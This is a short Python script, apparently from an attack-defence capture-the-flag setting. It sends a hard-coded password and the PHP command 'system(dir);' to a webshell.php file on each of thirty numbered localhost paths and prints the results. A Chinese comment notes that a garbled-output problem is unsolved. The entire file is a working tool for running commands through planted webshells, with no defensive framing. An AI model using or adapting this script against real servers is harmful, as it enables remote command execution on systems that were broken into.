#-*-coding:utf-8-*-
import requests
payload = {'passwd':'i4mhmh!','a':'system(dir);'}
for i in range(0,30):
    u = 'http://localhost/'+str(i)+'/webshell.php'  
    r = requests.post(url=u,data=payload)
    print(r.text)
'''尚未解决乱码问题'''
